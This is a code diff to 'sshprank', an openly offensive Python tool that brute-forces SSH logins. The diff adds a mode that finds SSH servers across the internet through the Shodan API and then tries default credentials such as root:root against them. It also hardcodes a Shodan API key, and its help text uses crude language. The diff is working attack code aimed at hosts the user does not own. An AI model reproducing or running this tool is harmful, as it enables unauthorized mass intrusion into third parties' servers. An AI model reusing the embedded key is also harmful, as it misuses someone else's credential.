@@ -31,11 +31,12 @@ import warnings
 import logging
 import masscan
 import paramiko
+import shodan
 from collections import deque
 
 
 __author__ = 'noptrix'
-__version__ = '1.0.2'
+__version__ = '1.1.0'
 __copyright = 'santa clause'
 __license__ = 'MIT'
 
@@ -82,6 +83,12 @@ HELP = BOLD + '''usage''' + NORM + '''
                           you need to specify '--source-ip <some_ipaddr>' which
                           is needed by masscan. better check masscan options!
 
+  -s <str:page:lim>     - search ssh servers using shodan and crack logins.
+                          see examples below. note: you need a better API key
+                          than this one i offer in order to search more than 100
+                          (= 1 page) ssh servers. so if you use this one use
+                          '1' for 'page'. don't bother me with this, bitch
+
   -b <file>             - list of hosts to grab sshd banner from
                           format: <host>[:ports]. multiple ports can be
                           seperated by comma (default port: 22)
@@ -97,7 +104,7 @@ HELP = BOLD + '''usage''' + NORM + '''
   -P <file>             - list of passwords
   -C <file>             - list of user:pass combination
   -x <num>              - num threads for parallel host crack (default: 20)
-  -s <num>              - num threads for parallel service crack (default: 20)
+  -S <num>              - num threads for parallel service crack (default: 20)
   -X <num>              - num threads for parallel login crack (default: 20)
   -B <num>              - num threads for parallel banner grabbing (default: 70)
   -T <sec>              - num sec for connect timeout (default: 2s)
@@ -127,6 +134,10 @@ HELP = BOLD + '''usage''' + NORM + '''
   # and crack login 'root:root' on found sshds
   $ sudo ./sshprank -m '-p22 --rate=1000' -r 1000 -v
 
+  # search 50 ssh servers  via shodan and crack logins using 'root:root' on
+  # found sshds
+  $ sudo ./sshprank -s 'SSH:1:50'
+
   # grab banners and output to file with format supported for '-l' option
   $ ./sshprank -b hosts.txt > sshds2.txt
 '''
@@ -134,6 +145,11 @@ HELP = BOLD + '''usage''' + NORM + '''
 opts = {
   'targets': [],
   'masscan_opts': '--open ',
+  'sho_opts': None,
+  'sho_str': None,
+  'sho_page': None,
+  'sho_lim': None,
+  'sho_key': 'Pp1oDSiavzKQJSsRgdzuxFJs8PQXzBL9',
   'cmd': None,
   'user': 'root',
   'pass': 'root',
@@ -204,7 +220,7 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:l:m:b:r:c:u:U:p:P:C:x:s:X:B:T:R:o:evVH')
+      'h:l:m:s:b:r:c:u:U:p:P:C:x:S:X:B:T:R:o:evVH')
     for o, a in _opts:
       if o == '-h':
         opts['targets'] = parse_target(a)
@@ -212,6 +228,8 @@ def parse_cmdline(cmdline):
         opts['targetlist'] = a
       if o == '-m':
         opts['masscan_opts'] += a
+      if o == '-s':
+        opts['sho_opts'] = a
       if o == '-b':
         opts['targetlist'] = a
       if o == '-r':
@@ -230,7 +248,7 @@ def parse_cmdline(cmdline):
         opts['combolist'] = a
       if o == '-x':
         opts['hthreads'] = int(a)
-      if o == '-s':
+      if o == '-S':
         opts['sthreads'] = int(a)
       if o == '-X':
         opts['lthreads'] = int(a)
@@ -260,24 +278,27 @@ def parse_cmdline(cmdline):
 
 def check_argv(cmdline):
   modes = False
-  needed = ['-h', '-l', '-m', '-b', '-H', '-V']
+  needed = ['-h', '-l', '-m', '-s', '-b', '-H', '-V']
 
   if set(needed).isdisjoint(set(cmdline)):
     log('wrong usage dude, check help', 'error')
 
   if '-h' in cmdline:
-    if '-l' in cmdline or '-m' in cmdline or '-b' in cmdline:
+    if '-l' in cmdline or '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
   if '-l' in cmdline:
-    if '-h' in cmdline or '-m' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
   if '-m' in cmdline:
-    if '-h' in cmdline or '-l' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-l' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
     #if not [s for s in cmdline if '--source-ip' in s]:
     #  log('--source-ip <some_ipaddr> is needed for -m option', 'error')
+  if '-s' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or '-l' in cmdline or '-b' in cmdline:
+      modes = True
   if '-b' in cmdline:
-    if '-h' in cmdline or '-l' in cmdline or '-m' in cmdline:
+    if '-h' in cmdline or '-l' in cmdline or '-m' in cmdline or '-s' in cmdline:
       modes = True
 
   if modes:
@@ -517,7 +538,7 @@ def crack_scan():
   if len(targets) > 0:
     opts['targetlist'] = 'sshds.txt'
     log_targets(targets, opts['targetlist'])
-    log('saved found sshds to sshds.txt', 'good')
+    log(f'saved found sshds to {opts["targetlist"]}', 'good')
     log('cracking found targets', 'info')
     crack_multi()
   else:
@@ -542,6 +563,45 @@ def check_banners():
   return
 
 
+def shodan_search():
+  global opts
+  targets = []
+
+  s = opts['sho_opts'].split(':')
+  if len(s) != 3:
+    log('format wrong, check usage and examples', 'error')
+  opts['sho_str'] = s[0]
+  opts['sho_page'] = s[1]
+  opts['sho_lim'] = s[2]
+
+  try:
+    api = shodan.Shodan(opts['sho_key'])
+    res = api.search(opts['sho_str'], opts['sho_page'], opts['sho_lim'])
+    for r in res['matches']:
+      if len(r) > 0:
+        banner = r['data'].split('\n')[0]
+        if opts['verbose']:
+          log(f'found sshd: {r["ip_str"]}:{r["port"]}:{banner}', 'good',
+            esc='\n')
+        targets.append(f'{r["ip_str"]}:{r["port"]}:{banner}\n')
+  except shodan.APIError as e:
+    log(f"shodan error: {e}", 'error')
+
+  return targets
+
+
+def crack_shodan(targets):
+  log(f'w00t w00t, found {len(targets)} sshds', 'good')
+  log('cracking shodan targets', 'info')
+  opts['targetlist'] = 'sshds.txt'
+  log_targets(targets, opts['targetlist'])
+  log(f'saved found sshds to {opts["targetlist"]}', 'good')
+  log('cracking found targets', 'info')
+  crack_multi()
+
+  return
+
+
 def main(cmdline):
   sys.stderr.write(BANNER + '\n\n')
   check_argc(cmdline)
@@ -558,12 +618,20 @@ def main(cmdline):
       crack_multi()
     elif '-m' in cmdline:
       if '-r' in cmdline:
-        log('cracking random targets', 'info')
+        log('scanning and cracking random targets', 'info')
         crack_random()
         crack_scan()
       else:
         log('scanning and cracking targets', 'info')
         crack_scan()
+    elif '-s' in cmdline:
+      log('searching for sshds via shodan', 'info')
+      targets = shodan_search()
+      tlen = len(targets)
+      if tlen > 0:
+        crack_shodan(targets)
+      else:
+        log('no sshds found :(', 'info')
     elif '-b' in cmdline:
       log('grabbing banners', 'info', esc='\n\n')
       check_banners()
